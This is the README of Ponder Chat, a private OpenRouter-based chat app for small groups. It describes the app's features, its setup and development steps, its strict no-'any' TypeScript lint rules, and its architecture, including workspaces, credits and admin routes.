<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="web/public/logo-dark.svg">
    <img src="web/public/logo-light.svg" alt="" width="64" height="64">
  </picture>
</p>

<h1 align="center">Ponder Chat</h1>

<p align="center">
  A private chat app for a small group of people. It runs on the models of OpenRouter, and each person gets a daily credit limit.<br>
  Answers cite their sources. You can quote any part of a reply. Ponder writes documents and slide decks, runs Python on your files, uses your connected apps and remembers what matters.
</p>

<p align="center">
  <a href="#run-it">Run it</a> ·
  <a href="#a-tour">A tour</a> ·
  <a href="#how-it-works">How it works</a> ·
  <a href="scripts/demo/README.md">Demo data</a>
</p>

![Ponder Chat with a chat about heat pumps open. The sidebar lists workspaces, recent chats and the credits left today. The reply cites its sources with small chips, and a note under it says what Ponder remembered.](docs/images/hero.webp)

Ponder is invite-only. An admin invites people by email, and each person signs in with a code or a link. Every call to a model asks for a Zero Data Retention endpoint, so no model provider keeps or trains on what people write. Replies are durable: a reload, a lost connection or a deploy does not stop a reply. The page reconnects, and the reply finishes.

## A tour

The images show the real app with made-up data from [`scripts/demo/`](scripts/demo/README.md).

### Answers with sources

Ponder searches the web and reads pages when a question needs current facts. Each fact in the reply links to its page. The link shows as a small chip, and a card with the page's title and an excerpt opens on hover. The steps above the reply show what Ponder searched and read.

Two switches under the message box set what a reply may reach. **Web** is for the chat: a chat in a workspace starts with it off, so replies come only from the workspace's Sources, and any other chat starts with it on. **Research** is for the next message: Ponder runs several deep searches, reads the pages and writes a report. With Web off in a workspace, a reply that does not find the answer in Sources says so and does not guess. A button under it, "Search the web for this", asks the same question again with one web search.

![A reply about heat pumps. The search steps are unfolded: a search and one page read. The pointer is on the Energy.gov chip, and a card shows the page's title, its address and an excerpt.](docs/images/citations.webp)

### Cite a reply

Select any text in a reply, and a **Cite** button opens under it. The quote goes into the message box as a chip, with an optional comment. The quote stays marked in the reply while you write, so the follow-up question is exact. In a sent message, the chip opens the quote and goes back to its source.

![A three-day Lisbon plan. The words "Take tram 28 early, before 9 am" are selected, and a Cite button sits under the selection.](docs/images/cite.webp)

![After Cite: the quote is marked in the reply, a comment box under it reads "We have a stroller. Is the tram still a good idea?", and the quote is a chip in the message box.](docs/images/cite-comment.webp)

### Documents, slide decks and web pages

Ask for something to keep, send or present, and Ponder writes it as an artifact: a Markdown document, a slide deck or a web page. The artifact opens in a panel beside the chat, where you can read it, copy it or download it. A deck downloads as HTML that prints one slide to a page. Present shows the deck full screen. Artifacts run in a sandboxed frame.

![A chat that asked for a board-meeting deck. The reply has a card for the deck, and the side panel shows its first two slides.](docs/images/slides.webp)

![Present mode: the slide "Q3 at a glance" fills the screen, with 412 active volunteers, 6,180 hours given and 38,500 meals packed.](docs/images/present.webp)

Sheets open in the same panel. Ask for data, and Ponder makes a CSV file with Python. A click on the file shows it as a table, with the header kept in view. CSV files that you attach open the same way.

![A chat that asked for sample data for 100 students. Python made students.csv, and the side panel shows it as a table with Student, Class, Maths, Science and English columns and 100 rows.](docs/images/table.webp)

### Cards in a reply

Ask for a comparison, a breakdown or a chart, and Ponder can answer with a card: headline figures, charts, a table or a list, drawn with frappe-ui while the reply streams. The figures come from the chat: what Ponder searched, read or computed, or what you gave it. Tabs on a card switch between views, and buttons send a follow-up question. See [`docs/cards.md`](docs/cards.md).

![A reply about monthly spending. A card shows needs of $1,770, wants of $295 and $300 saved, a donut chart of where the money goes, and All, Needs and Wants buttons above a table of the items.](docs/images/cards.webp)

### Python on your files

Attach a CSV or Excel file and ask a question. Ponder writes Python (pandas, matplotlib and more) and runs it in a sandbox with no network. The charts and files it makes come back into the chat. The code and its output are one click away.

![A chat with cafe-sales.csv attached. Under "Ran Python", a bar chart shows average pastries sold for each weekday, with Saturday and Sunday highest. A short answer and three suggestions follow.](docs/images/python.webp)

### Connectors that ask first

Connect any remote MCP server, such as Linear, Notion or a Frappe site, and Ponder can use its tools. Ponder searches the tools of your connectors for the ones a task needs, so you can connect many servers. A tool that only reads runs at once. A tool that changes something waits for you: Deny, Always allow or Allow once. You can show the exact input before you allow it.

![Ponder asks "Allow Ponder to use Linear: Create issue?" with Deny, Always allow and Allow once. Below, the details show the issue's team, title, priority and description.](docs/images/approval.webp)

Settings, Connectors lists each server and its tools. You set each tool to Always allow, Ask first or Off. Sign-in uses OAuth or an API key, and credentials are kept encrypted.

![The Linear connector in Settings. Three read-only tools are on Always allow, Create issue and Update issue are on Ask first, and Create comment is Off.](docs/images/connectors.webp)

### Skills

A skill is a set of instructions for one kind of task, such as a grant application or meeting minutes. Ponder knows the name and the description of each skill. When a message fits a description, Ponder loads that skill and follows it.

![Ponder answers a request for a grant outline. A line above the reply says Picked skill “Grant writing”, with the skill's description, and the outline follows the skill's headings: the need, the plan.](docs/images/skills-picked.webp)

To choose a skill yourself, type `$` in the message box. The skill then shows as a chip on your message. Some skills run only when someone asks for them.

![The skills menu over the message box after "$": Docx, Donor thank you, Grant writing, Meeting minutes, Technical writing and Volunteer newsletter, each with its description. Above it, an earlier message has the chip "Meeting minutes".](docs/images/skills-menu.webp)

Admins write skills in `/admin`, in a Markdown editor. Two switches set whether a skill is on for everyone, and whether Ponder can use it on its own. Ponder comes with two skills, for Word documents and for technical writing. See [`docs/skills.md`](docs/skills.md).

![The Grant writing skill in the admin editor: Markdown instructions on the left, and on the right its name, description, the switches "On for everyone" and "Ponder can use it on its own", and what Ponder sees first.](docs/images/skills-admin.webp)

### Workspaces

A workspace keeps the instructions and the files for one kind of work, such as a volunteer handbook or grant applications. A chat in a workspace follows its instructions and answers from its sources. The sidebar lists your workspaces. Pin the ones that you use most, and they stay at the top.

![The Volunteer handbook workspace: Alex's three chats in it, its instructions, four sources (two PDFs, a Markdown file and a CSV file) and its people. Everyone in the organisation can ask, and two people can edit. The message box starts a new chat in the workspace. In the sidebar, Grant applications and Volunteer handbook are pinned.](docs/images/workspace.webp)

A new workspace shows a card for each step: instructions, sources and people. You can ask at once, and do the steps later.

![The new workspace Events 2027 under "Set up this workspace", with three cards: Instructions, Sources and People, each with an illustration and a button. 0 of 3 done.](docs/images/workspace-setup.webp)

Share works as in Google Docs. Each person that you add can ask, or can also edit. General access opens a workspace to everyone in the organisation, and only an admin can do that. Chats stay private to the person who wrote them, also in a shared workspace.

![Share for the Grant applications workspace: Alex is the owner, Diego Morales and Sam Okafor can ask, and Lena Fischer can edit. General access is "Only people added".](docs/images/workspace-share.webp)

Sources are PDF, text, Markdown, CSV and JSON files. Ponder reads each file once and indexes it, and a model reads the pages that are pictures. A small source goes to the model whole. Ponder searches larger ones for each question. Details show how far a file is, and each step of its indexing.

![The Details of Annual report 2025.pdf in the side panel: a PDF of 40 pages, indexing at page 12 of 40, with a progress bar. The log says that it was uploaded and that two pages were read from pictures. On the left, its row in Sources shows the same progress.](docs/images/workspace-sources.webp)

### Memory you can see

After a reply, Ponder decides if you said something about yourself worth keeping. A note under the reply shows what it kept, with Undo. Settings › Memory lists every memory and the chat it came from. Ponder never keeps passwords, contact details, ID numbers, health details or what you say about other people.

![Settings open on Memory: the memories Ponder kept, each with its kind (About you or Preference), the chat it came from and when.](docs/images/memory.webp)

### Pick the model for each chat

Each new chat starts on Auto: for each message, OpenRouter's Auto Router picks one of Ponder's models and a reasoning effort. The model menu in the message box also lists a short set of models from DeepSeek, Anthropic, OpenAI, Google and others. Only models with a Zero Data Retention endpoint show. A reply names the model that wrote it, except under Auto. Bigger models use more of the day's credits.

![The model menu opened from the message box, with Auto selected and DeepSeek V4.1 Flash and Claude Haiku 5.5 listed below. Beside the model, Workspace chooses a workspace for the new chat.](docs/images/models.webp)

### A queue

Messages that you send during a reply wait in a queue above the message box. They go out in order, one after each reply. You can edit a queued message, drag it to a new place, or remove it. Steer stops the reply and sends that message now.

![A reply that is still being written, and under it two queued messages, each with Edit, Steer and Remove: "Add a line about parking at the back entrance" and "Then translate both emails into Spanish".](docs/images/queue.webp)

### Credits and admin

Each person has a daily credit limit, charged from what OpenRouter reports for each call. When the credits run out, a person can ask the admins for more. The admin pages show usage only, never chats: today's numbers, credits per day, active people and credits by model. Admins also invite people, set limits, answer requests and manage skills.

![The admin overview: a notice of one request for more credits, today's numbers (7 active people, 58 replies, 790 credits, $0.79) and a bar chart of credits used per day. The sidebar has Overview, Requests, People, Skills, Workspaces and Activity.](docs/images/admin.webp)

Over time, the overview shows credits per day, active people per day, and which models used the credits.

![The lower half of the admin overview: credits used per day and active people per day over the last 14 days, with "Back to chat" at the foot of the sidebar.](docs/images/admin-usage.webp)

![Credits by model for the last 14 days: a ring chart of 5,926 credits, with Claude Opus 5.5 at 40% and Claude Sonnet 5.5 at 22%.](docs/images/admin-models.webp)

People lists everyone with an account and the invites that wait, with each person's credits today, the last 7 days and when they were last active.

![The People page: eight people with an account and two invites, each with a status, credits used today against their limit, credits in the last 7 days and when they were last active.](docs/images/admin-people.webp)

Each row has a menu to set a person's daily credits, make them an admin, sign them out everywhere, or ban them.

![The actions menu of Sam Okafor's row: Set daily credits, Make admin, Sign out everywhere and Ban.](docs/images/admin-actions.webp)

A person's page shows their numbers for 30 days and the devices they are signed in on. It never shows their chats, only how many there are.

![Sam Okafor's page: 151 of 2,500 credits today, 629 credits and 57 replies in the last 7 days, 11 chats, a chart of credits used per day, their details, and two devices they are signed in on.](docs/images/admin-person.webp)

### Also in Ponder

- **Files in a side panel.** Attached PDFs, images, CSV, text, Markdown and JSON files open beside the chat, and a workspace's documents beside its page. A PDF draws each page as it comes near the screen. A CSV shows as a table, and Markdown as a reply does.
- **Search and export.** The search box above the chat list finds chats by the words in their titles and messages. Each chat's menu exports it as a Markdown file.

## Run it

Ponder needs Node, PostgreSQL with the `vector` extension, and an OpenRouter key. Python needs Deno and uv.

Secrets are in `~/.config/ponder-chat/.env` (mode 600): `DATABASE_URL` (database `ponder_chat`), `OPENROUTER_API_KEY` (until an admin saves a key in `/admin`, Settings), `BETTER_AUTH_SECRET`, `PONDER_HOSTS`, and the credit settings. Optional: `PONDER_ENCRYPTION_KEY` for connector credentials (see "Connectors").

```bash
npm install
npm run sandbox:setup                                  # once: Pyodide and its packages
set -a; . ~/.config/ponder-chat/.env; set +a
WORKFLOW_POSTGRES_URL=$DATABASE_URL npx --no-install bootstrap   # once, and after upgrades
npm run build
./start.sh        # http://127.0.0.1:3500
```

Then, with the app's environment:

1. Invite yourself: `npx tsx scripts/invite.ts add you@example.org`.
2. Sign in at http://127.0.0.1:3500. Without email settings, the sign-in email is printed in the server log.
3. Make yourself an admin: `npx tsx scripts/admin.ts grant you@example.org`.

Two settings point Ponder at other servers, for the tests: `OPENROUTER_BASE_URL` (every OpenRouter call; default `https://openrouter.ai/api`) and `CLOUDFLARE_API_URL` (the email API). Production sets neither.

Tests: `npm run e2e` builds Ponder and runs the end-to-end tests in a browser, with a fake OpenRouter in place of the real one, and test MCP servers for connectors. They need Docker for Postgres. See [`e2e/README.md`](e2e/README.md). CI runs them, the type checks, the lint, `server/trusted-pages.check.ts`, `server/connector-catalog.check.ts`, `server/tracing.check.ts`, `server/workflow/loop.check.ts` and `server/mcp.check.ts` on every pull request.

Checks: `npm run typecheck` (web), `npm run typecheck:server`, `npm run typecheck:e2e`, `npm run lint` (no `any`, see "Develop"), `npm run test` (the server's unit tests; set `TEST_DATABASE_URL` to a throwaway Postgres to include the database tests, [`docs/effect.md`](docs/effect.md)), `npx tsx server/context.check.ts`, `npx tsx server/connector-catalog.check.ts`, `npx tsx server/memory.check.ts`, `npx tsx server/search.check.ts [--live]`, `npx tsx server/trusted-pages.check.ts`, `npx tsx server/fetch-page.check.ts`, `npx tsx server/pdf-text.check.ts`, `npx tsx server/tracing.check.ts`, `npx tsx server/workflow/loop.check.ts`, and `npx tsx server/mcp.check.ts [--live]` (with the app's environment; it writes two test people to the database and deletes them).

To try connectors locally, run `npx tsx server/mcp.check.ts --serve` (test MCP servers with no sign-in, an API key, and OAuth that signs in at once), and start Ponder with `MCP_ALLOW_PRIVATE_NETWORKS=1`.

To try Ponder with demo data, or to make the images above again after a UI change, see [`scripts/demo/README.md`](scripts/demo/README.md).

## Develop

`npm run dev` starts two servers: `nitro dev` for the server, and Vite for the pages. Open the Vite address. Vite sends `/api`, `/health` and `/oauth` to the server.

- A change under `web/` updates the open page (hot reload).
- A change under `server/` makes Nitro build the server again and restart it. This takes a few seconds.

To start:

1. Make a database on a Postgres with pgvector. The e2e Postgres works (`e2e/README.md`): `createdb -h 127.0.0.1 -p 55433 -U ponder ponder_dev`.
2. Put the settings in `.env` in the repository. Git ignores this file.

   ```bash
   DATABASE_URL=postgres://ponder:ponder@127.0.0.1:55433/ponder_dev
   BETTER_AUTH_SECRET=<a random string of 32 or more characters>
   OPENROUTER_API_KEY=<your key>
   PONDER_PYTHON=off   # or run npm run sandbox:setup once
   ```

3. Run `npm run dev`, and open http://localhost:5173.
4. Invite yourself: `set -a; . ./.env; set +a; npx tsx scripts/invite.ts add you@example.org`. The sign-in email is in the log of `npm run dev`.

`scripts/dev.ts` sets the rest, as `start.sh` does. Workflow runs are in the development database, with the Postgres World. Each start runs `npx bootstrap`, which creates or updates the workflow's tables. The server listens on 127.0.0.1:3501, and Vite on 127.0.0.1:5173. To change the ports, set `PORT` and `WEB_PORT` in `.env`. Sign-in links use the Vite port. To open the pages through another host, such as a tunnel, set `PONDER_HOSTS` to all the hosts, such as `localhost:5173,dev.example.org`.

To spend nothing on OpenRouter, use the fake from the end-to-end tests:

1. Start it: `npx tsx -e 'import("./e2e/fake/server.ts").then((f) => f.startFake(3502))'`.
2. Set `OPENROUTER_API_KEY=sk-or-fake` and `OPENROUTER_BASE_URL=http://127.0.0.1:3502/api` in `.env`.

Limits:

- A server restart cuts the reply in progress. After the restart, the reply runs its current step again. A model call has 3 attempts (see "Durable replies").
- Vite does not send the Content Security Policy that `server/app.ts` adds to each page. To check the policy, use `npm run build` and `npm start`.
- After a change to `nitro.config.ts` or `.env`, start `npm run dev` again.
- Memory does not save. The workflow's development bundle does not copy `gate.json` and `extract.md` (`server/memory/`), so each save logs `ENOENT`. Replies are not affected.

### No `any`

Ponder's TypeScript has no `any`, in the web app, the server and the tests:

- Do not write `any` (`: any`, `as any`, `any[]`). Do not turn a check off with a comment: no `@ts-ignore`, `@ts-expect-error`, `@ts-nocheck`, `oxlint-disable`, `eslint-disable` or `@vue-ignore`.
- Do not let `any` in from untyped values: `response.json()`, `JSON.parse`, IndexedDB, `event.data`, `workerData`, raw SQL rows, a library's loose types. Give them the type `unknown` and narrow it. On the server, decode them with `Schema` ([`docs/effect.md`](docs/effect.md)). Do not assert a type on them (`(await response.json()) as Thing`): an assertion from `any` hides the `any`. Where a cast is right, as in a typed helper, cast from `unknown`, so that it is seen.
- In `server/`, `e2e/`, `scripts/` and `shared/`, the declarations in `types/` make `JSON.parse`, `json()` of a fetch `Request` or `Response`, and `Array.isArray` give `unknown` in place of `any`. `web/` does not have them: its typecheck reads frappe-ui's source, which needs the `any`. There, assign the value to an `unknown` variable first.
- Where a library gives `any`, wrap it once in a small typed function or declaration.
- Tests read JSON answers with `jsonBody` and `parseJson` (`server/test-json.ts`) or `jsonOf` (`e2e/fixtures.ts`, for Playwright's answers), typed as the shape the test expects. `expected` (`server/test-json.ts`) does the same for another value of no known type, such as a tool's output.
- Put types that other files use in `.ts` files, not in `.vue` files. For a component's `defineExpose`, write its type in a `.ts` file, check it with `defineExpose({ ... } satisfies Handle)` and type the parent's ref with it (`web/workspaces/handles.ts`).

`npm run lint` checks this. CI runs it on every pull request. It runs four checks:

- oxlint (`.oxlintrc.json`) on every `.ts` and `.js` file and on the scripts of `.vue` files: no written `any`, and no `@ts-` comments (`ban-ts-comment`). In `.ts` files, its type-aware rules (oxlint-tsgolint) also stop `any` that flows in: `no-unsafe-assignment`, `-member-access`, `-call`, `-return` and `-argument`. They read the types with each folder's `tsconfig.json`.
- `scripts/no-any-casts.ts` fails on a type assertion (`as` or `<T>`) from `any` in the `.ts` files. It runs oxlint's `no-unsafe-type-assertion` alone and drops the reports of assertions that narrow a type that is not `any`, by their message. That rule has no option to report only the assertions from `any`. Any other report fails, so a message that a newer oxlint words differently fails too, and does not get through. It takes about 4 seconds.
- ESLint (`eslint.config.js`, `npm run lint:vue`) runs the same six rules on the `<script>` of each `.vue` file, which tsgolint cannot read, and `ponder/no-any-cast`: typescript-eslint's `no-unsafe-type-assertion` without the narrowing reports, by their message id. typescript-eslint needs TypeScript 5's JS API, so it loads the copy that frappe-ui has (`scripts/typescript5.cjs`), like vue-tsc. It reads the types with `web/browser-check/tsconfig.eslint.json`.
- `scripts/no-suppressions.ts` fails on `oxlint-` and `eslint-` disable and enable comments, inline rule settings, and `@vue-ignore`, `@vue-expect-error` and `@vue-skip`, in every file git tracks or would track. oxlint has no setting to ignore them.

`npm run typecheck` also checks that `web/` uses only what the browser has. Its second step (`npm run typecheck:browser`) runs vue-tsc with the browser's types and without Node's (`web/browser-check/tsconfig.json`). Then `process`, `Buffer`, `globalThis.process`, `node:fs`, `net` and `timer.unref()` are type errors there. A timer is a `number`, and `ReturnType<typeof setTimeout>` is `number` too. The web app's types include the server's API types (`web/api.ts`), and the server's code brings Node's types. So this check reads declarations of the API's types (`npm run api-types`, `server/tsconfig.api-types.json`, written to `node_modules/.cache/ponder-api-types`). `web/browser-check/pg.d.ts` stands in for pg's types, which bring Node's: the API's types name pg's `Pool` only as a server option. `scripts/typecheck-browser.ts` fails if Node's types get into that program some other way.

What these checks do not catch:

- An `any` in a `.vue` template (`{{ }}`, `v-if`, an `@click` handler). The unsafe rules read only the `<script>`. vue-tsc checks the template's types, but it lets an `any` through. Keep logic in the `<script>`.
- An `any` that a generic function's default type parameter hides, such as Hono's `c.req.json<T = any>()`: in `(await c.req.json()) as Thing`, TypeScript reads `T` from the assertion, so the value asserted is a `Thing`, not `any`. Use `jsonBody(c.req)`.
- A callback's parameter that is typed over a library's `any`, such as `worker.once("message", (answer: Answer) => …)`. The unsafe rules read the parameter's type, not the library's.
- An `any` that flows in from Deno globals or `npm:` imports in `sandbox/pyodide`. tsgolint cannot read Deno's types, so only a written `any` fails there. Plain `.js`, `.mjs` and `.cjs` files have no types, so the unsafe rules are off for them too.

## How it works

Ponder started as a copy of the Seva platform with its Frappe parts removed. Python and memory came back later, adapted. The sections below describe each part and where its code is.

### People, models and chats

- Sign-in by email (Better Auth), for invited people only (`scripts/invite.ts`). One email holds a 6-digit code and a link. Either one signs the person in, so a mail scanner that opens the link first does not lock them out. Both expire in 15 minutes. A code takes 3 wrong tries. A code is checked only by signing in with it: Better Auth's route that checks a code alone is off, and so are codes of any type other than sign-in.
- Admins: Better Auth's admin plugin gives each person a role, "user" or "admin", and stops a banned person from signing in. Run on the server with the app's environment: `npx tsx scripts/admin.ts grant someone@example.org`, `revoke <email>` or `list`.
- Models: the list is in `server/models/Models.ts`, and it is also the allowlist. A request for any other model gets the default, Auto (`CHAT_DEFAULT_MODEL` changes it). Every new chat starts on Auto; an old chat keeps the model of its last reply.
- Auto (`server/models/AutoRouter.ts`): `openrouter/auto` with the `auto-router` plugin. `allowed_models` holds only the models on the list with a ZDR endpoint, and `cost_tier` is the cost level that admins set in Settings, Auto (low, medium or high; medium by default). The chat's id goes as `session_id`, so OpenRouter keeps a chat on one model where it can. Its window is the smallest window of those models, every PDF gets the free parser, and the call carries Anthropic's cache marks. The replies of an Auto chat drop their reasoning on the next call, because the next model may differ. OpenRouter's decision model, which reads each message to pick the model, is not covered by the ZDR rule as far as its docs say.
- Privacy: every OpenRouter call (replies, names, memory, embeddings) asks for Zero Data Retention endpoints only (`server/openrouter/OpenRouter.ts`). The model menu shows only the models that have such an endpoint, from OpenRouter's public list. OpenRouter's own PDF parser is not covered by this rule.
- Chat names: a cheap model writes them. Search uses Postgres full-text search (`server/thread-search.ts`). Export to Markdown runs in the browser (`web/export-markdown.ts`).
- Side panel (`web/side-panel/`): on a narrow screen the panel covers the page. pdf.js loads only the first time a PDF opens. A CSV or TSV file shows up to 2,000 rows. Cmd- or Ctrl-click still opens the file in a new tab.
- Artifacts (`server/artifacts/schema.ts`, `web/artifacts/`): a deck is HTML, one `<section>` per 1280×720 slide. The content is the tool call's input, so it is saved with the message. Writing the same id again makes a new version. Slides run no scripts and load nothing from other addresses. While a reply writes an artifact, the card lists its steps (`web/artifacts/steps.ts`). Replies skip OpenRouter providers that send a tool call only when it is complete (Wafer), so the artifact shows as it is written (`server/workflow/model.ts`).
- Memory: see `docs/memory.md`.

### Workspaces

A workspace holds a name, instructions and documents for chats. A chat can be in one workspace. The plan is in `docs/workspaces-plan.md`.

- Editing: people who can edit rename a workspace by its title on the workspace page (Enter or leaving the field saves, Escape cancels). "Add" or "Edit" by its Instructions opens a dialog with only the instructions. The ⋯ menu has Delete only.
- A workspace still has a description in the database and the API, but the app does not ask for it or show it for now.

- Sharing: Share works as Google Docs does. Each person added has a role, "Can ask" or "Can edit". General access (`workspaces.org_access`) is "Only people added" (`none`) or "Everyone in the organisation" (`ask`). Every workspace starts private, and only an admin opens it to everyone or closes it. Each change applies at once, as one request: add or change a person, remove a person, or change General access. Opening or closing it asks first. People keep their roles when General access changes.
- Access (`server/workspaces/access.ts`): `Workspaces.accessOf` gives `none`, `ask`, `edit` or `owner`: the higher of the person's own role and what General access gives them. The owner is `owner`. A member has their role. While a workspace is open to everyone, admins get `edit` and everyone else `ask`. While it is private, everyone else is `none`, admins too, until someone adds them. A deleted workspace is `none` for everyone.
- Who shares: everyone who can edit (the owner, members with Can edit, and admins while it is open) adds people, changes their roles and removes them. Nobody changes or removes the owner. Who deletes: the owner, and admins while it is open. An admin opens a workspace to everyone only if they own it; any admin closes one.
- A workspace that the person cannot use answers 404, never 403. A request does not show that it exists.
- Chats stay private to the person who wrote them, also in a shared workspace. Members share the instructions, never the chats.
- The first message of a new chat sets its workspace (`threads.workspace_id`). It never changes. The server checks the person's access on each message. A person who was removed can still read the chat, but gets a 403 when they send.
- The instructions go in the system prompt in a `<workspace>` block, after Ponder's own rules, so the prompt cache keeps them. A fixed guidance text calls the block data from people, which never overrides Ponder's rules (`server/workspaces/prompt.ts`).
- Changes to a workspace while it is open to everyone go to the admin activity log, one event for each change: opening and closing it too. Deleting a workspace marks it deleted and deletes its documents. Its chats stay, in no workspace.

Documents (`server/workspaces/documents/`):

- An upload takes the same files and the same 10 MB limit as a chat attachment, without images: PDF, text, Markdown, CSV, TSV and JSON. The bytes go to the bucket under `workspaces/<workspace>/<document>`, or into Postgres when no bucket is set up.
- A workflow run indexes it (`Indexer.ts`, `index-workflow.ts`): it reads the text once (a PDF with LiteParse, and picture pages with a model), splits it into passages by structure, each with a location line (reading and splitting run in a worker thread, `prepare-text.ts`, stopped after 30 seconds, 2 minutes for a PDF, or 512 MB, and within the limits of `limits.ts`: 2,000 pages, 20 million characters, 25,000 passages), embeds them 96 at a time with `PONDER_EMBEDDING_MODEL`, and marks the document `ready` or `failed`. A run that a crash cut short goes on from the batch it was in. At start-up, documents that another embedding model indexed are indexed again.
- Each step goes to the document's indexing log (`workspace_document_log`): numbers, page numbers, model names and errors, never the text. The cost of a step is read from its `runs` row.
- Indexing and search cost no credits. Their model calls are in `runs` as system spend (`workspace-index`, `workspace-pdf`, `workspace-search`), in the name of the uploader or the asker. `charged_runs` leaves out every system function id (`Runs.SYSTEM_FUNCTION_IDS`), titles and memory embeddings too.
- In a chat turn, the ready documents go whole into the system prompt as `<document>` blocks when they fit in half of the model's window and in 300,000 characters. Otherwise the largest go to search first. For the documents in search, the 8 best passages for the person's message go with it in a `<workspace_excerpts>` block, and the model gets `workspace_search(query)`, bound to the chat's workspace. Search mixes pgvector and full text with reciprocal rank fusion, over the current model's passages of ready documents in that workspace only.

| Route | Who | Answer |
| --- | --- | --- |
| `GET /api/workspaces` | Anyone | `{ workspaces }`: the workspaces the person can use, the ones they pinned first, then the newest made first. Each has `pinned` and `createdAt`. Also in the boot data. |
| `POST /api/workspaces` | Anyone | `{ workspace }` (201), private |
| `GET /api/workspaces/:id` | `ask` and above | `{ workspace }`, with `orgAccess`, `canShare`, `canDelete` and `canChangeOrgAccess`. `members` is null except for a person who can share it. `documents`: `{ id, name, mediaType, size, status, error, createdAt, progress }`, oldest first; `status` is `reading`, `ready` or `failed`. `progress` is how far a `reading` document is: `{ phase: "pages", done, total }` while a model reads a PDF's picture pages (the pages whose text is ready, of all the pages), then `{ phase: "embedding", done, total }` (passages). It is null for other statuses, and before there is anything to count. |
| `PATCH /api/workspaces/:id` | `edit` and above | `{ workspace }`: name, description, instructions, icon |
| `PUT /api/workspaces/:id/members/:userId` | Who shares | `{ access: "ask" \| "edit" }`: adds the person, or changes their role. `{ workspace }`. 400 for a person with no account, 403 for the owner. |
| `DELETE /api/workspaces/:id/members/:userId` | Who shares | Removes the person, themselves too. `{ workspace }`, as the person who asked sees it now. |
| `PUT /api/workspaces/:id/access` | Admins: the owner, or any admin while it is open | `{ orgAccess: "none" \| "ask" }`: General access. `{ workspace }`. |
| `DELETE /api/workspaces/:id` | The owner, admins while it is open | `{ ok: true }` |
| `PUT /api/workspaces/:id/pin`, `DELETE /api/workspaces/:id/pin` | `ask` and above | `{ pinned }`. Pins the workspace at the top of the person's own list, or unpins it. Nobody else sees the pin. A deleted workspace takes its pins with it. |
| `POST /api/workspaces/:id/documents` | `edit` and above | A form with `file`. `{ document }` (201), `reading`. 400 with `{ error }` for a file that is not a document, 413 over 10 MB. |
| `DELETE /api/workspaces/:id/documents/:doc` | `edit` and above | `{ ok: true }`. Its passages and log go with it. |
| `GET /api/workspaces/:id/documents/:doc/log` | `edit` and above | `{ document, steps }`, with `progress` on `document`. Each step: `{ generation, step, at, detail, costUsd }`. A PDF's `parsed` step comes once it is parsed, and each `page-read` step once its page is read. |
| `POST /api/workspaces/:id/documents/:doc/retry` | `edit` and above | "Try again": `{ document }`, `reading` again. 409 unless the document failed. |
| `GET /api/workspaces/:id/documents/:doc/file` | `ask` and above | The uploaded file, inline, as `/api/files/:id` sends it, with `Cache-Control: private, no-cache`. A click on a document's name opens it in the side panel. |
| `GET /api/people?q=` | Anyone | `{ people }`: at most 20, by name or email, with id, name and email |
| `POST /api/chat` | `ask` and above | The body takes `workspaceId`, read on a new chat's first message only. |

### Credits

| Setting | Meaning |
| --- | --- |
| Default daily credits | Credits for each person each day. |
| Credits per US dollar | Credits per US dollar of OpenRouter cost. With 1000, one credit is $0.001. |

- Both settings are in the `settings` table (one row), and admins change them on `/admin`, Settings. The first start fills the row from `CHAT_DAILY_CREDITS` (default 1000) and `CHAT_CREDITS_PER_USD` (default 1000). After that, the app does not read these two variables.

- Credits are charged from the cost that OpenRouter reports for each call. The `runs` table records it (`server/telemetry/`).
- The calls that write chat names are recorded in `runs` but are not charged to credits. The view `charged_runs` (`server/telemetry/Runs.ts`) holds this rule, and which run ends a reply (`is_reply`). Credits, `/admin` and `deploy/sentinel.sh` all read it.
- A model call that did not finish is also recorded in `runs` but not charged: a call that a crash cut short (`finish_reason` "interrupted", or "started" until the reply settles it), a call that failed and was tried again ("retried"), the last failed attempt ("failed"), and the call that Stop cut short ("stopped"). OpenRouter can bill them, so `deploy/sentinel.sh`'s daily cost, which reads `runs`, includes them.
- Each web search is a `runs` row (`function_id` `web-search`) and is charged: about $0.007, so 7 credits.
- Each summary of a long chat is a `runs` row (`function_id` `compaction`) and is charged. With DeepSeek V4.1 Flash, a summary of 200,000 tokens costs about $0.01, so 10 credits. See "Long chats".
- The count starts again at midnight UTC.
- Before each reply, the server adds up today's cost. When nothing is left, it answers 402 and the page shows when credits refill.
- Nothing is reserved before a reply. The last reply of the day can go a little past the limit.
- To give one person a different limit, use `/admin`, or run on the server with the app's environment: `npx tsx scripts/credits.ts set someone@example.org 3000`. `reset <email>` puts them back on the default, and `list` shows who has their own limit. An invite can set the limit that the person starts with.
- A person who has used today's credits can ask the admins for more. The admins get a message on `NOTIFY_URL`, and answer on `/admin`, Requests. An approval adds extra credits to that day's limit only (`credit_grants`). The person gets an email either way. One request can wait at a time, and after an answer they can ask again. An admin can also give extra credits from a person's page, without a request.
- PDFs: see "Files" below.

### Admin

`/admin` is a second Vite page (`web/admin.html`, `web/admin/`) with its own routes under `/admin/`. The server sends `dist/admin.html` for `/admin` and `/admin/*`. Its API is under `/api/admin/*` (`server/admin/routes.ts`), and every route there needs the admin role (`requireAdmin`, which reads the role from the database). A person who is signed out goes to `/` to sign in. A person without the role sees "This page is for admins".

| Page | What it shows |
| --- | --- |
| Overview | Today's numbers, credits and active people per day over 7, 14 or 30 days, credits by model, and who uses Ponder. A notice when requests wait. The "System" line: what the app's own calls cost over the same days, for each system function id, in US dollars. |
| Requests | Requests for more credits that wait, with Approve and Decline. Below: the answers of the last 30 days. |
| People | Everyone with an account, and invites without one. Invite people. Set a daily limit, make or remove an admin, sign out everywhere, ban and unban, email the invite again, cancel an invite. |
| Person | One person's numbers, 30 days of credits, models, details and sessions. Give extra credits for today. |
| Settings | A dialog, from the account menu or Cmd+Shift+, (Ctrl+Shift+,). Its General tab has the default daily credits, credits per US dollar, "Read PDF text on this server" (see "Files"), the summary model for long chats (see "Long chats"), the OpenRouter key and the list of admins. Its Branding tab sets the organisation's logo, for light and dark mode (see "Logo"). On a phone, Settings is a page in the tab bar, with Branding under General. |
| Workspaces | Workspaces open to everyone: owner, people added, documents, status, errors and what indexing cost. A click on a document opens its indexing log. Private workspaces as totals only (see below). On a phone, it is in the account menu. |
| Activity | Each change an admin made, newest first: who did it, to whom, what changed and when. A click on a name shows that person's events only. Read only. On a phone, it is in the account menu. |

- Admins see usage only. The admin API reads `runs` (cost, model, time), `sessions` (device and time) and the number of threads. It never returns messages or thread titles.
